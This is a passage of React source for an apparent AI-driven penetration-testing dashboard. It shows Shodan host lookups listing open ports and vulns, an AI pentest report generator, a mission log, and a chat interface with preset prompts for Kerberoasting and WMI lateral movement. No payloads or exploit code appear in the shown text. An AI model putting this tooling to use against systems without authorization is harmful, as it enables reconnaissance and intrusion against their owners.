      {res && (<div style={S.card("rgba(255,140,0,0.08)")}><div style={{ color: "#ff8c00", fontSize: 12, marginBottom: 10 }}>▸ {res.total?.toLocaleString()} total results</div>{res.matches?.map((m, i) => (<div key={i} style={{ padding: "8px 10px", marginBottom: 6, background: "rgba(0,0,0,0.3)", borderRadius: 4, border: "1px solid rgba(255,140,0,0.1)" }}><div style={{ display: "flex", gap: 12, flexWrap: "wrap" }}><span style={{ color: "#ff8c00", fontFamily: "monospace", fontSize: 12 }}>{m.ip_str}:{m.port}</span><span style={{ color: "rgba(255,255,255,0.4)", fontSize: 11 }}>{m.org}</span><span style={{ color: "rgba(255,255,255,0.3)", fontSize: 11 }}>{m.location?.country_name}</span></div>{m.data && <div style={{ color: "rgba(255,255,255,0.25)", fontSize: 10, fontFamily: "monospace", marginTop: 4 }}>{m.data.slice(0, 120)}</div>}</div>))}</div>)}
      {ipInfo && (<div style={S.card("rgba(255,140,0,0.08)")}><div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 12 }}>{[["IP", ipInfo.ip_str], ["ORG", ipInfo.org], ["ISP", ipInfo.isp], ["COUNTRY", ipInfo.country_name], ["CITY", ipInfo.city], ["OS", ipInfo.os || "Unknown"]].map(([k, v]) => v && (<div key={k}><span style={S.label}>{k}</span><span style={{ color: "#ff8c00", fontSize: 12, fontFamily: "monospace" }}>{v}</span></div>))}</div>{ipInfo.ports && <div><span style={S.label}>OPEN PORTS</span><div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>{ipInfo.ports.map(p => (<span key={p} style={{ padding: "3px 8px", background: "rgba(255,140,0,0.15)", border: "1px solid rgba(255,140,0,0.3)", borderRadius: 3, color: "#ff8c00", fontSize: 12, fontFamily: "monospace" }}>{p}</span>))}</div></div>}{ipInfo.vulns && <div style={{ marginTop: 10 }}><span style={S.label}>DETECTED VULNS</span><div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>{Object.keys(ipInfo.vulns).map(v => (<span key={v} style={{ padding: "3px 8px", background: "rgba(255,0,64,0.15)", border: "1px solid rgba(255,0,64,0.3)", borderRadius: 3, color: "#ff0040", fontSize: 11, fontFamily: "monospace" }}>{v}</span>))}</div></div>}</div>)}
    </div>
  );
};

const ReportWriter = () => {
  const [form, setForm] = useState({ client: "", scope: "", date: new Date().toISOString().split("T")[0], tester: "", findings: "", severity: "High", methodology: "Black Box", tools: "", exec_summary: "" });
  const [report, setReport] = useState(""); const [loading, setLoading] = useState(false);
  const f = (k, v) => setForm(p => ({ ...p, [k]: v }));
  const generate = async () => {
    setLoading(true); setReport("");
    try {
      const prompt = `Generate a professional penetration testing report:\nClient: ${form.client}\nScope: ${form.scope}\nDate: ${form.date}\nTester: ${form.tester}\nMethodology: ${form.methodology}\nTools: ${form.tools}\nFindings: ${form.findings}\nHighest Severity: ${form.severity}\nExec Summary Notes: ${form.exec_summary}\n\nCreate a complete pentest report with: Executive Summary, Scope & Methodology, Technical Findings (CVSS scores, descriptions, remediation), Risk Matrix, and Recommendations.`;
      const r = await fetch("https://api.anthropic.com/v1/messages", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ model: "claude-sonnet-4-20250514", max_tokens: 1000, system: "You are an elite penetration testing report writer. Generate professional, detailed security assessment reports.", messages: [{ role: "user", content: prompt }] }) });
      const d = await r.json(); setReport(d.content?.[0]?.text || "Error.");
    } catch (e) { setReport("Error: " + e.message); }
    setLoading(false);
  };
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
      <div style={S.card("rgba(168,85,247,0.15)")}>
        <div style={{ color: "#a855f7", fontSize: 12, letterSpacing: 3, marginBottom: 12 }}>📄 AI PENTEST REPORT WRITER</div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
          {[["CLIENT", "client", "Acme Corp"], ["TESTER", "tester", "John Doe"]].map(([l, k, p]) => (<div key={k}><span style={S.label}>{l}</span><input value={form[k]} onChange={e => f(k, e.target.value)} placeholder={p} style={S.input("rgba(168,85,247,0.3)")} /></div>))}
          <div><span style={S.label}>SCOPE</span><input value={form.scope} onChange={e => f("scope", e.target.value)} placeholder="192.168.1.0/24, app.example.com" style={S.input("rgba(168,85,247,0.3)")} /></div>
          <div><span style={S.label}>DATE</span><input type="date" value={form.date} onChange={e => f("date", e.target.value)} style={S.input("rgba(168,85,247,0.3)")} /></div>
          <div><span style={S.label}>METHODOLOGY</span><select value={form.methodology} onChange={e => f("methodology", e.target.value)} style={S.select("rgba(168,85,247,0.3)")}>{["Black Box", "White Box", "Grey Box", "Red Team", "Purple Team"].map(m => <option key={m}>{m}</option>)}</select></div>
          <div><span style={S.label}>HIGHEST SEVERITY</span><select value={form.severity} onChange={e => f("severity", e.target.value)} style={S.select("rgba(168,85,247,0.3)")}>{["Critical", "High", "Medium", "Low", "Informational"].map(s => <option key={s}>{s}</option>)}</select></div>
        </div>
        <div style={{ marginTop: 10 }}><span style={S.label}>TOOLS USED</span><input value={form.tools} onChange={e => f("tools", e.target.value)} placeholder="Nmap, Burp Suite, Metasploit, Nikto..." style={S.input("rgba(168,85,247,0.3)")} /></div>
        <div style={{ marginTop: 10 }}><span style={S.label}>KEY FINDINGS</span><textarea value={form.findings} onChange={e => f("findings", e.target.value)} rows={3} placeholder="SQL injection on login, RCE via file upload, weak admin credentials..." style={{ ...S.input("rgba(168,85,247,0.3)"), resize: "vertical", lineHeight: 1.6 }} /></div>
        <div style={{ marginTop: 10 }}><span style={S.label}>EXEC SUMMARY NOTES</span><textarea value={form.exec_summary} onChange={e => f("exec_summary", e.target.value)} rows={2} placeholder="Overall risk posture, key business impact..." style={{ ...S.input("rgba(168,85,247,0.3)"), resize: "vertical", lineHeight: 1.6 }} /></div>
        <button onClick={generate} disabled={loading} style={{ ...S.btn("#a855f7", "rgba(168,85,247,0.14)"), marginTop: 14 }}>{loading ? "⟳ GENERATING..." : "▶ GENERATE REPORT"}</button>
      </div>
      {report && (<div><div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8 }}><span style={S.label}>GENERATED REPORT</span><button onClick={() => navigator.clipboard.writeText(report)} style={S.btn("#a855f7", "rgba(168,85,247,0.1)")}>⎘ COPY</button></div><div style={{ ...S.card("rgba(168,85,247,0.06)"), maxHeight: 500, overflowY: "auto" }}><div style={{ color: "rgba(255,255,255,0.85)", fontSize: 12, fontFamily: "monospace", lineHeight: 1.8, whiteSpace: "pre-wrap" }}><TW text={report} speed={4} /></div></div></div>)}
    </div>
  );
};

const MissionLog = ({ missions, onDelete, onLoad }) => (
  <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
    <div style={S.card("rgba(0,255,65,0.08)")}><div style={{ color: "#00ff41", fontSize: 12, letterSpacing: 3, marginBottom: 4 }}>📋 MISSION LOG</div><div style={{ color: "rgba(255,255,255,0.3)", fontSize: 11 }}>{missions.length} operation(s) on record</div></div>
    {!missions.length && <div style={{ textAlign: "center", padding: "40px 20px", color: "rgba(255,255,255,0.2)", fontSize: 12, fontFamily: "monospace" }}>No missions logged. Save a conversation via the 💾 button.</div>}
    {missions.map((m, i) => (
      <div key={i} style={S.card("rgba(255,255,255,0.03)")}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 8 }}>
          <div><div style={{ color: "#00ff41", fontSize: 12, fontFamily: "monospace" }}>OP #{String(i + 1).padStart(3, "0")} — {m.name}</div><div style={{ color: "rgba(255,255,255,0.25)", fontSize: 10, marginTop: 2 }}>{m.timestamp} · {m.messages.length} msgs · {m.agent}</div></div>
          <div style={{ display: "flex", gap: 8 }}>
            <button onClick={() => onLoad(m)} style={S.btn("#00d4ff", "rgba(0,212,255,0.08)")}>LOAD</button>
            <button onClick={() => onDelete(i)} style={S.btn("#ff3b3b", "rgba(255,59,59,0.08)")}>DEL</button>
          </div>
        </div>
        <div style={{ color: "rgba(255,255,255,0.35)", fontSize: 11, fontFamily: "monospace" }}>{m.messages.find(x => x.role === "user")?.content?.slice(0, 110)}...</div>
      </div>
    ))}
  </div>
);

export default function NexusCyberOps() {
  const [tab, setTab] = useState("CHAT");
  const [toolTab, setToolTab] = useState("NMAP");
  const [selectedAgent, setSelectedAgent] = useState("PHANTOM");
  const [allMode, setAllMode] = useState(false);
  const [messages, setMessages] = useState([]);
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [activeAgentThinking, setActiveAgentThinking] = useState(null);
  const [missions, setMissions] = useState([]);
  const [missionName, setMissionName] = useState("");
  const [showSave, setShowSave] = useState(false);
  const [bootDone, setBootDone] = useState(false);
  const [bootLines, setBootLines] = useState([]);
  const messagesEndRef = useRef(null);

  const BOOT = [
    "> NEXUS CYBER OPS v5.0.0 — INITIALIZING...",
    "> MITRE ATT&CK v14.1 loaded",
    "> Agents online: PHANTOM ✓  SENTINEL ✓  GHOST ✓",
    "> Nmap Builder ✓  Payload Generator ✓  CVE Lookup ✓",
    "> Shodan Intelligence ✓  Report Writer ✓  Mission Log ✓",
    "─────────────────────────────────────────────────",
    "> ALL SYSTEMS NOMINAL. NEXUS ONLINE.",
  ];

  useEffect(() => {
    let i = 0;
    const iv = setInterval(() => {
      if (i < BOOT.length) { setBootLines(p => [...p, BOOT[i]]); i++; }
      else { clearInterval(iv); setTimeout(() => setBootDone(true), 400); }
    }, 180);
    return () => clearInterval(iv);
  }, []);

  useEffect(() => { messagesEndRef.current?.scrollIntoView({ behavior: "smooth" }); }, [messages, loading]);

  const sendMessage = useCallback(async () => {
    if (!input.trim() || loading) return;
    const userMsg = { role: "user", content: input.trim(), timestamp: new Date().toLocaleTimeString() };
    setMessages(p => [...p, userMsg]); setInput(""); setLoading(true);
    try {
      for (const agentId of (allMode ? ["PHANTOM", "SENTINEL", "GHOST"] : [selectedAgent])) {
        setActiveAgentThinking(agentId);
        const agent = AGENTS[agentId];
        const hist = [...messages, userMsg].filter(m => m.role === "user" || m.agent === agentId).slice(-8).map(m => ({ role: m.role === "user" ? "user" : "assistant", content: m.content }));
        const r = await fetch("https://api.anthropic.com/v1/messages", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ model: "claude-sonnet-4-20250514", max_tokens: 1000, system: agent.systemPrompt, messages: hist }) });
        const d = await r.json();
        setMessages(p => [...p, { role: "assistant", agent: agentId, content: d.content?.[0]?.text || "[Error]", streaming: true, timestamp: new Date().toLocaleTimeString() }]);
        if (allMode) await new Promise(r => setTimeout(r, 200));
      }
    } catch (e) { setMessages(p => [...p, { role: "assistant", content: `[ERROR] ${e.message}`, timestamp: new Date().toLocaleTimeString() }]); }
    setActiveAgentThinking(null); setLoading(false);
  }, [input, loading, messages, selectedAgent, allMode]);

  const saveMission = () => {
    if (!missionName.trim() || !messages.length) return;
    setMissions(p => [...p, { name: missionName, messages, timestamp: new Date().toLocaleString(), agent: allMode ? "ALL AGENTS" : selectedAgent }]);
    setMissionName(""); setShowSave(false);
  };

  const TABS = ["CHAT", "TOOLS", "CVE", "SHODAN", "REPORT", "MISSIONS"];
  const TOOL_TABS = ["NMAP", "PAYLOADS"];
  const QUICK = ["Full recon on a target domain", "Kerberoasting attack steps", "Detect C2 beaconing in logs", "Bug bounty recon methodology", "Lateral movement via WMI", "Ransomware IR playbook", "ESP32 / IoT attack surface"];
  const agent = AGENTS[selectedAgent];

  return (
    <div style={{ minHeight: "100vh", background: "#020408", color: "#e0e0e0", fontFamily: "'Courier New', monospace", position: "relative", overflow: "hidden" }}>
      <style>{`
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
        @keyframes scan{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
        @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
        ::-webkit-scrollbar{width:3px}::-webkit-scrollbar-track{background:#050508}::-webkit-scrollbar-thumb{background:#1a3a2a;border-radius:2px}
        textarea,input{outline:none!important}option{background:#0a0a0f}
      `}</style>
      <MatrixRain />

      {/* HEADER */}
      <div style={{ position: "relative", zIndex: 10, height: 54, borderBottom: "1px solid rgba(0,255,65,0.1)", background: "rgba(2,4,8,0.97)", display: "flex", alignItems: "center", padding: "0 16px", gap: 16 }}>
        <div style={{ color: "#00ff41", fontSize: 18, fontWeight: "bold", letterSpacing: 8, textShadow: "0 0 18px #00ff41", flexShrink: 0 }}>NEXUS</div>
        <div style={{ color: "rgba(255,255,255,0.15)", fontSize: 9, letterSpacing: 2, flexShrink: 0 }}>v5.0</div>
        {bootDone && (
          <div style={{ display: "flex", gap: 1 }}>
            {TABS.map(t => (
              <div key={t} onClick={() => setTab(t)} style={{ padding: "5px 12px", cursor: "pointer", fontSize: 10, letterSpacing: 2, border: `1px solid ${tab === t ? "#00ff41" : "transparent"}`, borderRadius: 4, color: tab === t ? "#00ff41" : "rgba(255,255,255,0.25)", background: tab === t ? "rgba(0,255,65,0.07)" : "transparent", transition: "all 0.2s" }}>{t}</div>
            ))}
          </div>
        )}
        <div style={{ marginLeft: "auto", display: "flex", alignItems: "center", gap: 10 }}>
          {tab === "CHAT" && messages.length > 0 && bootDone && (
            <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
              {showSave && <input value={missionName} onChange={e => setMissionName(e.target.value)} placeholder="Mission name..." style={{ ...S.input(), width: 150, fontSize: 11, padding: "4px 10px" }} onKeyDown={e => e.key === "Enter" && saveMission()} />}
              <button onClick={() => showSave ? saveMission() : setShowSave(p => !p)} style={{ ...S.btn(), fontSize: 10, padding: "4px 10px" }}>💾 SAVE</button>
              {showSave && <button onClick={() => setShowSave(false)} style={{ ...S.btn("#ff3b3b", "rgba(255,59,59,0.1)"), fontSize: 10, padding: "4px 8px" }}>✕</button>}
            </div>
          )}
          <div style={{ display: "flex", gap: 4 }}>
            {[AGENTS.PHANTOM.color, AGENTS.SENTINEL.color, AGENTS.GHOST.color].map((c, i) => (
              <div key={i} style={{ width: 5, height: 5, borderRadius: "50%", background: c, boxShadow: `0 0 6px ${c}`, animation: "pulse 1.5s infinite", animationDelay: `${i * 0.4}s` }} />
            ))}
          </div>
        </div>
      </div>

      {!bootDone ? (
        <div style={{ position: "relative", zIndex: 10, padding: "50px 40px", maxWidth: 700 }}>
          {bootLines.map((l, i) => (<div key={i} style={{ color: l.includes("✓") ? "#00ff41" : l.startsWith("─") ? "rgba(0,255,65,0.15)" : "rgba(0,255,65,0.7)", fontSize: 13, marginBottom: 7, animation: "fadeIn 0.3s ease" }}>{l}</div>))}
          <span style={{ color: "#00ff41", animation: "blink .7s infinite" }}>█</span>
        </div>
      ) : (
        <div style={{ position: "relative", zIndex: 10, display: "flex", height: "calc(100vh - 54px)" }}>
          {/* SIDEBAR */}
          <div style={{ width: 230, flexShrink: 0, borderRight: "1px solid rgba(255,255,255,0.05)", background: "rgba(2,4,8,0.95)", display: "flex", flexDirection: "column", padding: 12, gap: 7, overflowY: "auto" }}>
            <div style={S.sec}>▸ AGENTS</div>
            {Object.values(AGENTS).map(a => (
              <div key={a.id} onClick={() => { setSelectedAgent(a.id); setAllMode(false); setTab("CHAT"); }} style={{ padding: "9px 11px", borderRadius: 6, cursor: "pointer", border: `1px solid ${!allMode && selectedAgent === a.id ? a.color : "rgba(255,255,255,0.06)"}`, background: !allMode && selectedAgent === a.id ? a.dimColor : "rgba(0,0,0,0.18)", boxShadow: !allMode && selectedAgent === a.id ? `0 0 14px ${a.glow}` : "none", transition: "all 0.2s", position: "relative", overflow: "hidden" }}>
                {!allMode && selectedAgent === a.id && <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 1, background: `linear-gradient(90deg,transparent,${a.color},transparent)`, animation: "scan 2s linear infinite" }} />}
                <div style={{ display: "flex", alignItems: "center", gap: 7 }}>
                  <span style={{ fontSize: 15 }}>{a.icon}</span>
                  <div style={{ flex: 1 }}><div style={{ color: a.color, fontSize: 11, letterSpacing: 2 }}>{a.id}</div><div style={{ color: "rgba(255,255,255,0.25)", fontSize: 9 }}>{a.role}</div></div>
                  <div style={{ width: 5, height: 5, borderRadius: "50%", background: activeAgentThinking === a.id ? "#ffaa00" : a.color, animation: "pulse 1.5s infinite" }} />
                </div>
              </div>
            ))}
            <div onClick={() => { setAllMode(true); setTab("CHAT"); }} style={{ padding: "9px 11px", borderRadius: 6, cursor: "pointer", border: `1px solid ${allMode ? "#00ff41" : "rgba(255,255,255,0.06)"}`, background: allMode ? "rgba(0,255,65,0.07)" : "rgba(0,0,0,0.18)", transition: "all 0.2s" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 7 }}><span style={{ fontSize: 15 }}>⚡</span><div><div style={{ color: allMode ? "#00ff41" : "rgba(255,255,255,0.4)", fontSize: 11, letterSpacing: 2 }}>ALL AGENTS</div><div style={{ color: "rgba(255,255,255,0.2)", fontSize: 9 }}>FULL SPECTRUM</div></div></div>
            </div>
            <div style={{ borderTop: "1px solid rgba(255,255,255,0.05)", paddingTop: 10, marginTop: 2 }}>
              <div style={S.sec}>▸ QUICK OPS</div>
              {QUICK.map(q => (
                <div key={q} onClick={() => { setTab("CHAT"); setInput(q); }} style={{ padding: "5px 8px", border: "1px solid rgba(255,255,255,0.04)", borderRadius: 4, fontSize: 10, color: "rgba(255,255,255,0.35)", cursor: "pointer", marginBottom: 3, lineHeight: 1.4, transition: "all 0.15s" }} onMouseOver={e => { e.currentTarget.style.color = "rgba(255,255,255,0.75)"; e.currentTarget.style.borderColor = "#00ff41"; }} onMouseOut={e => { e.currentTarget.style.color = "rgba(255,255,255,0.35)"; e.currentTarget.style.borderColor = "rgba(255,255,255,0.04)"; }}>▸ {q}</div>
              ))}
            </div>
            <div style={{ marginTop: "auto", borderTop: "1px solid rgba(255,255,255,0.05)", paddingTop: 8 }}>
              <div onClick={() => setMessages([])} style={{ padding: "6px 10px", textAlign: "center", border: "1px solid rgba(255,59,59,0.18)", borderRadius: 4, color: "rgba(255,59,59,0.45)", fontSize: 10, cursor: "pointer" }}>◻ CLEAR SESSION</div>
            </div>
          </div>

          {/* MAIN */}
          <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
            {/* Tab bar */}
            <div style={{ padding: "9px 18px", borderBottom: "1px solid rgba(255,255,255,0.05)", background: "rgba(0,0,0,0.25)", display: "flex", alignItems: "center", gap: 10, minHeight: 44 }}>
              {tab === "CHAT" && (<><span style={{ fontSize: 17 }}>{allMode ? "⚡" : agent.icon}</span><div><div style={{ color: allMode ? "#00ff41" : agent.color, fontSize: 11, letterSpacing: 3 }}>{allMode ? "FULL SPECTRUM" : agent.id}</div><div style={{ color: "rgba(255,255,255,0.2)", fontSize: 9 }}>{allMode ? "PHANTOM + SENTINEL + GHOST" : agent.tagline}</div></div>{loading && <div style={{ marginLeft: "auto", color: "#ffaa00", fontSize: 9, letterSpacing: 2, animation: "pulse .8s infinite" }}>◈ PROCESSING</div>}</>)}
              {tab === "TOOLS" && (<><span style={{ color: "#00ff41", fontSize: 11, letterSpacing: 3, marginRight: 10 }}>⚙ TOOLS</span>{TOOL_TABS.map(t => (<div key={t} onClick={() => setToolTab(t)} style={{ padding: "3px 12px", fontSize: 10, cursor: "pointer", letterSpacing: 2, borderRadius: 4, border: `1px solid ${toolTab === t ? "#00ff41" : "rgba(255,255,255,0.08)"}`, color: toolTab === t ? "#00ff41" : "rgba(255,255,255,0.35)", background: toolTab === t ? "rgba(0,255,65,0.07)" : "transparent" }}>{t}</div>))}</>)}
              {tab === "CVE" && <span style={{ color: "#00d4ff", fontSize: 11, letterSpacing: 3 }}>🔍 CVE DATABASE (NVD)</span>}
              {tab === "SHODAN" && <span style={{ color: "#ff8c00", fontSize: 11, letterSpacing: 3 }}>🌐 SHODAN INTELLIGENCE</span>}
              {tab === "REPORT" && <span style={{ color: "#a855f7", fontSize: 11, letterSpacing: 3 }}>📄 PENTEST REPORT WRITER</span>}
              {tab === "MISSIONS" && <span style={{ color: "#00ff41", fontSize: 11, letterSpacing: 3 }}>📋 MISSION LOG — {missions.length} OPS</span>}
            </div>

            <div style={{ flex: 1, overflow: "hidden", display: "flex", flexDirection: "column" }}>
              {/* CHAT */}
              {tab === "CHAT" && (<>
                <div style={{ flex: 1, overflowY: "auto", padding: "18px 20px" }}>
                  {!messages.length && (
                    <div style={{ textAlign: "center", marginTop: "12%", animation: "fadeIn 1s ease" }}>
                      <div style={{ fontSize: 50, marginBottom: 12, opacity: 0.18 }}>{allMode ? "⚡" : agent.icon}</div>
                      <div style={{ color: allMode ? "#00ff41" : agent.color, fontSize: 13, letterSpacing: 4 }}>{allMode ? "ALL AGENTS READY" : `${agent.id} ONLINE`}</div>
                      <div style={{ color: "rgba(255,255,255,0.2)", fontSize: 11, marginTop: 8 }}>Awaiting operator command.</div>
                      <div style={{ color: "rgba(255,255,255,0.1)", fontSize: 10, marginTop: 10 }}>⚠ For authorized penetration testing and ethical security research only.</div>
                    </div>
                  )}
                  {messages.map((msg, i) => {
                    const isUser = msg.role === "user"; const a = msg.agent ? AGENTS[msg.agent] : null;
                    return (
                      <div key={i} style={{ display: "flex", flexDirection: isUser ? "row-reverse" : "row", gap: 9, marginBottom: 16, animation: "fadeIn 0.3s ease", alignItems: "flex-start" }}>
                        <div style={{ width: 30, height: 30, borderRadius: 5, background: isUser ? "rgba(255,255,255,0.05)" : (a ? a.dimColor : "rgba(0,0,0,0.3)"), border: `1px solid ${isUser ? "rgba(255,255,255,0.12)" : (a ? a.color : "rgba(255,255,255,0.08)")}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 13, flexShrink: 0, boxShadow: a ? `0 0 8px ${a.glow}` : "none" }}>{isUser ? "◈" : (a ? a.icon : "⬡")}</div>
                        <div style={{ maxWidth: "80%" }}>
                          <div style={{ fontSize: 9, letterSpacing: 2, marginBottom: 4, color: isUser ? "rgba(255,255,255,0.25)" : (a ? a.accent : "rgba(255,255,255,0.35)"), textAlign: isUser ? "right" : "left" }}>{isUser ? "OPERATOR" : (a ? `[${a.id} // ${a.role}]` : "[NEXUS]")}</div>
                          <div style={{ background: isUser ? "rgba(255,255,255,0.04)" : "rgba(0,0,0,0.55)", border: `1px solid ${isUser ? "rgba(255,255,255,0.07)" : (a ? `${a.color}28` : "rgba(255,255,255,0.07)")}`, borderRadius: isUser ? "9px 3px 9px 9px" : "3px 9px 9px 9px", padding: "10px 13px", boxShadow: a ? `0 0 12px ${a.glow}15` : "none" }}>
                            <div style={{ color: "rgba(255,255,255,0.87)", fontFamily: "monospace", fontSize: 12, lineHeight: 1.75, whiteSpace: "pre-wrap", wordBreak: "break-word" }}>{msg.streaming ? <TW text={msg.content} /> : msg.content}</div>
                          </div>
                          <div style={{ fontSize: 9, color: "rgba(255,255,255,0.14)", marginTop: 3, textAlign: isUser ? "right" : "left" }}>{msg.timestamp}</div>
                        </div>
                      </div>
                    );
                  })}
                  {loading && activeAgentThinking && (
                    <div style={{ display: "flex", gap: 9, marginBottom: 14, alignItems: "flex-start" }}>
                      <div style={{ width: 30, height: 30, borderRadius: 5, background: AGENTS[activeAgentThinking].dimColor, border: `1px solid ${AGENTS[activeAgentThinking].color}`, display: "flex", alignItems: "center", justifyContent: "center", animation: "pulse 0.8s infinite", boxShadow: `0 0 10px ${AGENTS[activeAgentThinking].glow}` }}>{AGENTS[activeAgentThinking].icon}</div>
                      <div style={{ padding: "10px 13px", background: "rgba(0,0,0,0.5)", border: `1px solid ${AGENTS[activeAgentThinking].color}28`, borderRadius: "3px 9px 9px 9px", display: "flex", gap: 5, alignItems: "center" }}>
                        {[0, 1, 2].map(j => <div key={j} style={{ width: 6, height: 6, borderRadius: "50%", background: AGENTS[activeAgentThinking].color, animation: "pulse 1s infinite", animationDelay: `${j * 0.15}s` }} />)}
                        <span style={{ color: "rgba(255,255,255,0.25)", fontSize: 10, marginLeft: 4 }}>{AGENTS[activeAgentThinking].id} analyzing...</span>
                      </div>
                    </div>
                  )}
                  <div ref={messagesEndRef} />
                </div>
                <div style={{ padding: "12px 18px", borderTop: "1px solid rgba(255,255,255,0.05)", background: "rgba(2,4,8,0.95)" }}>
                  <div style={{ border: `1px solid ${allMode ? "rgba(0,255,65,0.28)" : `${agent.color}45`}`, borderRadius: 7, background: "rgba(0,0,0,0.3)", display: "flex" }}>
                    <div style={{ padding: "0 11px", display: "flex", alignItems: "center", color: allMode ? "#00ff41" : agent.color, borderRight: "1px solid rgba(255,255,255,0.05)", fontSize: 13 }}>▸</div>
                    <textarea value={input} onChange={e => setInput(e.target.value)} onKeyDown={e => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); sendMessage(); } }} placeholder={`Command ${allMode ? "ALL AGENTS" : agent.id}...`} disabled={loading} rows={1} style={{ flex: 1, background: "transparent", border: "none", color: "rgba(255,255,255,0.87)", fontFamily: "monospace", fontSize: 12, padding: "12px 11px", resize: "none", lineHeight: 1.5, maxHeight: 100, caretColor: allMode ? "#00ff41" : agent.color }} />
                    <button onClick={sendMessage} disabled={loading || !input.trim()} style={{ padding: "0 16px", background: !loading && input.trim() ? (allMode ? "rgba(0,255,65,0.08)" : agent.dimColor) : "transparent", border: "none", borderLeft: "1px solid rgba(255,255,255,0.05)", color: !loading && input.trim() ? (allMode ? "#00ff41" : agent.color) : "rgba(255,255,255,0.12)", cursor: !loading && input.trim() ? "pointer" : "not-allowed", fontSize: 16, borderRadius: "0 6px 6px 0" }}>{loading ? "◈" : "▶"}</button>
                  </div>
                  <div style={{ display: "flex", justifyContent: "space-between", marginTop: 5 }}>
                    <div style={{ color: "rgba(255,255,255,0.12)", fontSize: 9 }}>ENTER send · SHIFT+ENTER newline</div>
                    <div style={{ color: "rgba(255,255,255,0.12)", fontSize: 9 }}>{messages.filter(m => m.role === "user").length} ops · NEXUS v5.0</div>
                  </div>
                </div>
              </>)}

              {tab === "TOOLS" && <div style={{ flex: 1, overflowY: "auto", padding: 20 }}>{toolTab === "NMAP" ? <NmapBuilder /> : <PayloadGen />}</div>}
              {tab === "CVE" && <div style={{ flex: 1, overflowY: "auto", padding: 20 }}><CVELookup /></div>}
              {tab === "SHODAN" && <div style={{ flex: 1, overflowY: "auto", padding: 20 }}><ShodanSearch /></div>}
              {tab === "REPORT" && <div style={{ flex: 1, overflowY: "auto", padding: 20 }}><ReportWriter /></div>}
              {tab === "MISSIONS" && <div style={{ flex: 1, overflowY: "auto", padding: 20 }}><MissionLog missions={missions} onDelete={i => setMissions(p => p.filter((_, j) => j !== i))} onLoad={m => { setMessages(m.messages); setTab("CHAT"); }} /></div>}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
